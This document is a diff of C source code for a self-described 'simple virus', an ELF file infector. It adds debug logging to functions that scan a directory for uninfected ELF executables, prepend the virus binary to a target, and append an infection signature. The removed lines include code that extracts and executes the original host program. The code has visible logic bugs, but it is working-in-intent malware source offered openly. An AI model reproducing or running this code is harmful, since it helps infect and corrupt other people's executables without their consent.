@@ -71,10 +71,16 @@ int verify_is_elf(char *file_name)
 
 		if(my_buffer[0]==0x7f && my_buffer[1]==0x45 && my_buffer[2]==0x4c && my_buffer[3]==0x46)
 		{
+#ifdef DEBUGMODE
+			printf("Verifying if this file %s is ELF Type:  True. \n",file_name);
+#endif
 			return true;
 		}
 		else
 		{
+#ifdef DEBUGMODE
+			printf("Verifying if this file %s is ELF Type:  False.\n ",file_name);
+#endif
 			return false;
 		}
 	}
@@ -112,7 +118,7 @@ int verify_if_is_infected(char *file_name, char *virus_signature,int length_of_s
 		if(!strcmp(my_buffer,virus_signature))
 		{
 #ifdef DEBUGMODE
-			puts("True, it is already infected.");
+			printf("Verifying if this file %s is already infected: True, it is already infected.\n",file_name);
 #endif
 
 			return true; // 'true'(=1) and 'false'(=0) given to you by the power of #include <stdbool.h> :)
@@ -120,7 +126,7 @@ int verify_if_is_infected(char *file_name, char *virus_signature,int length_of_s
 		else
 		{
 #ifdef DEBUGMODE
-			puts("False  it not infected.");
+			printf("Verifying if this file %s is already infected: False, it is not infected.\n",file_name);
 #endif
 			return false;
 		}
@@ -131,10 +137,16 @@ int verify_is_original_file(char *file_name, char *virus_file_name)
 {
 	if(!strcmp(file_name,virus_file_name))
 	{
+#ifdef DEBUGMODE
+		printf("Verifying if this file %s is the original type:  True. \n",file_name);
+#endif
 		return true;
 	}
 	else
 	{
+#ifdef DEBUGMODE
+		printf("Verifying if this file %s is the original type:  False.\n ",file_name);
+#endif
 		return false;
 	}
 }
@@ -185,203 +197,149 @@ char *search_for_target(char *path_to_target_directory, char *virus_file_name, c
 			}
 			else
 			{
-               puts("fuck ya");
-				if(!verify_if_is_infected(string_filename, virus_signature, length_of_signature) && verify_is_elf(string_filename) && !verify_is_original_file(string_filename, virus_file_name))		{
-					{
-						closedir(my_directory);
+				puts("-------------------------------------------------------------------------");
+				if( !verify_if_is_infected(string_filename, virus_signature, length_of_signature) && verify_is_elf(string_filename) && !verify_is_original_file(string_filename, virus_file_name))
+				{
+					closedir(my_directory);
 
-
-			printf("This file is not infected yet \t ---> %s  --> so I am going to infect it now.\n",string_filename);
-
-						return(string_filename);
-					}
+#ifdef DEBUGMODE
+					printf("This file is not infected yet \t ---> %s  --> so I am going to infect it now.\n",string_filename);
+#endif
+					return(string_filename);
 				}
+				else
+				{
+#ifdef DEBUGMODE
+					printf("I not am going to infect this file %s . It is either already infected, it is not an ELF file or it is the original file.\n",string_filename);
+#endif
+					return NULL;
+				}
+				closedir(my_directory);
 			}
-			closedir(my_directory);
 		}
 	}
 }
 
-	void execute_virus_mission()
+
+
+
+void execute_virus_mission()
+{
+	puts("Hello, I am a simple virus. Yet, I can be deadly. Did you have your medicine today??");
+}
+
+// I stamp any infected file so that one can recognize it later against the healthy ones. Day Z zombie day, right??
+void stamp_the_infected_file(char *file_name, char *virus_signature)
+{
+
+#ifdef DEBUGMODE
+	printf("%s -> %s", __FILE__,__func__);
+#endif
+
+	FILE *pFile=fopen(file_name,"ab"); //"ab" goes for 'append binary..."
+
+	if(!pFile)
 	{
-		puts("Hello, I am a simple virus. Yet, I can be deadly. Did you have your medicine today??");
+#ifdef DEBUGMODE
+		perror("Error when creating file pointer.");
+#endif
+	}
+	else
+	{
+		int i;
+		for(i=0;i<strlen(virus_signature);i++)
+		{
+			fputc(virus_signature[i],pFile);
+		}
 	}
 
-	// I stamp any infected file so that one can recognize it later against the healthy ones. Day Z zombie day, right??
-	void stamp_the_infected_file(char *file_name, char *virus_signature)
+#ifdef DEBUGMODE
+	printf("Hey, I stamped the following file as infected ---> %s with the signature [ %s ]. \n", file_name, virus_signature);
+#endif
+
+	fclose(pFile);
+	pFile=NULL;
+}
+
+int go_infect_the_target_file(char *target_binary_file_name,char *virus_binary_file_name, long size_of_virus)
+{
+
+#ifdef DEBUGMODE
+	printf("%s -> %s .\n", __FILE__,__func__);
+	printf("I am executing this function with the parameters 'target' -->%s , 'virus-binary' ---> %s, 'size of virus' ---> %ld .\n",target_binary_file_name,virus_binary_file_name,size_of_virus);
+#endif
+
+	printf("the target %s.\n",target_binary_file_name);
+
+	char *temp=(char *) malloc(sizeof(char) * (strlen(target_binary_file_name)+1));
+	strcpy(temp, target_binary_file_name);
+	printf("the target %s.\n",target_binary_file_name);
+	printf("the temp %s.\n",temp);
+
+	long size_of_target=what_is_the_file_length(temp);
+	long final_infected_binary[size_of_virus + size_of_target];
+	long i=0;
+
+	FILE *pVirusFile=fopen(virus_binary_file_name,"rb");
+
+	if(!pVirusFile)
 	{
-
 #ifdef DEBUGMODE
-		printf("%s -> %s", __FILE__,__func__);
+		perror("Error when creating virus file pointer.");
 #endif
-
-		FILE *pFile=fopen(file_name,"ab"); //"ab" goes for 'append binary..."
-
-		if(!pFile)
+	}
+	else
+	{
+		for (; i < size_of_virus; i++)
 		{
-	#ifdef DEBUGMODE
-			perror("Error when creating file pointer.");
-	#endif
+			final_infected_binary[i]=fgetc(pVirusFile);
 		}
-		else
-		{
-			int i;
-			for(i=0;i<strlen(virus_signature);i++)
-			{
-				fputc(virus_signature[i],pFile);
-			}
-		}
-
-#ifdef DEBUGMODE
-		printf("Hey, I stamped the following file as infected ---> %s with the signature [ %s ]. \n", file_name, virus_signature);
-#endif
-
-		fclose(pFile);
-		pFile=NULL;
 	}
 
-	int go_infect_the_target_file(char *target_binary_file_name,char *virus_binary_file_name, long size_of_virus)
+	fclose(pVirusFile);
+	pVirusFile=NULL;
+
+	printf("the target %s.\n",temp);
+
+	FILE *pTargetBinaryFile=fopen(temp,"rb");
+
+	if(!pTargetBinaryFile)
 	{
-
 #ifdef DEBUGMODE
-		printf("%s -> %s .\n", __FILE__,__func__);
-		printf("I am executing this function with the parameters 'target' -->%s , 'virus-binary' ---> %s, 'size of virus' ---> %ld .\n",target_binary_file_name,virus_binary_file_name,size_of_virus);
+		perror("Error when creating target file pointer.");
+		printf("Error when creating a file pointer to %s.\n",target_binary_file_name);
 #endif
-
-		printf("the target %s.\n",target_binary_file_name);
-
-		char *temp=(char *) malloc(sizeof(char) * (strlen(target_binary_file_name)+1));
-		strcpy(temp, target_binary_file_name);
-		printf("the target %s.\n",target_binary_file_name);
-		printf("the temp %s.\n",temp);
-
-		long size_of_target=what_is_the_file_length(temp);
-		long final_infected_binary[size_of_virus + size_of_target];
-		long i=0;
-
-		FILE *pVirusFile=fopen(virus_binary_file_name,"rb");
-
-		if(!pVirusFile)
+	}
+	else
+	{
+		for(;i<size_of_virus+size_of_target;i++)
 		{
-		#ifdef DEBUGMODE
-			perror("Error when creating virus file pointer.");
-		#endif
+			final_infected_binary[i]=fgetc(pTargetBinaryFile);
 		}
-		else
-		{
-			for (; i < size_of_virus; i++)
-			{
-				final_infected_binary[i]=fgetc(pVirusFile);
-			}
-		}
+	}
 
-		fclose(pVirusFile);
-		pVirusFile=NULL;
+	fclose(pTargetBinaryFile);
+	pTargetBinaryFile=NULL;
 
-		printf("the target %s.\n",temp);
+	FILE *pNewTargetBinaryFile=fopen(virus_binary_file_name,"wb");
 
-		FILE *pTargetBinaryFile=fopen(temp,"rb");
-
-		if(!pTargetBinaryFile)
-		{
+	if(!pNewTargetBinaryFile)
+	{
 #ifdef DEBUGMODE
-			perror("Error when creating target file pointer.");
-			printf("Error when creating a file pointer to %s.\n",target_binary_file_name);
-#endif
-		}
-		else
-		{
-			for(;i<size_of_virus+size_of_target;i++)
-			{
-				final_infected_binary[i]=fgetc(pTargetBinaryFile);
-			}
-		}
-
-		fclose(pTargetBinaryFile);
-		pTargetBinaryFile=NULL;
-
-		FILE *pNewTargetBinaryFile=fopen(virus_binary_file_name,"wb");
-
-		if(!pNewTargetBinaryFile)
-		{
-#ifdef DEBUGMODE
-	perror("Error when creating file pointer.");
+		perror("Error when creating file pointer.");
 #endif
 		return false;
-		}
-		else
-		{
-			for(int j=0;j<size_of_virus+size_of_target;j++)
-			{
-				fputc(final_infected_binary[j],pNewTargetBinaryFile);
-			}
-
-			fclose(pNewTargetBinaryFile);
-			pNewTargetBinaryFile=NULL;
-
-			return true;
-		}
 	}
-
-	void extract_action_from_virus(char *binary_file_name, char *temporary_file_name, long size_of_virus, long length_of_signature)
+	else
 	{
-#ifdef DEBUGMODE
-		printf("%s -> %s", __FILE__,__func__);
-#endif
-
-		long size_of_binary=what_is_the_file_length(binary_file_name);
-
-		FILE *pBinaryFile=fopen(binary_file_name,"rb");
-		FILE *pTemporaryFile=fopen(temporary_file_name,"wb");
-
-		fseek(pBinaryFile,size_of_virus,SEEK_SET);
-
-		long i;
-		for(i=0;i<size_of_binary-size_of_virus-length_of_signature;i++)
+		for(int j=0;j<size_of_virus+size_of_target;j++)
 		{
-			fputc(fgetc(pBinaryFile),pTemporaryFile);
+			fputc(final_infected_binary[j],pNewTargetBinaryFile);
 		}
 
-		fclose(pBinaryFile);
-		fclose(pTemporaryFile);
+		fclose(pNewTargetBinaryFile);
+		pNewTargetBinaryFile=NULL;
 
-		char accessmode[]="0755";
-		char *ptr;
-		int access=strtol(accessmode,&ptr,8);
-
-		if(chmod(temporary_file_name,i)<0)
-		{
-#ifdef DEBUGMODE
-			perror("Error when applying chmod() function");
-#endif
-		}
+		return true;
 	}
-
-	void execute_action(char *file_name, char *argv[], char *temporary_file_name, long size_of_virus, long length_of_signature)
-	{
-#ifdef DEBUGMODE
-		printf("%s -> %s", __FILE__,__func__);
-#endif
-
-		extract_action_from_virus(file_name, temporary_file_name, size_of_virus, length_of_signature);
-
-		pid_t process_id=fork();
-
-		if(process_id==0)
-		{
-			//executing this from the newly created child process
-			if(execv(temporary_file_name,argv)<0)
-			{
-#ifdef DEBUGMODE
-				perror("Error with execv");
-#endif
-			}
-		}
-		else
-		{
-			//executing this from the old parent
-		    waitpid(process_id, NULL, 0);
-		    remove(temporary_file_name);
-		}
-
-	}
+}
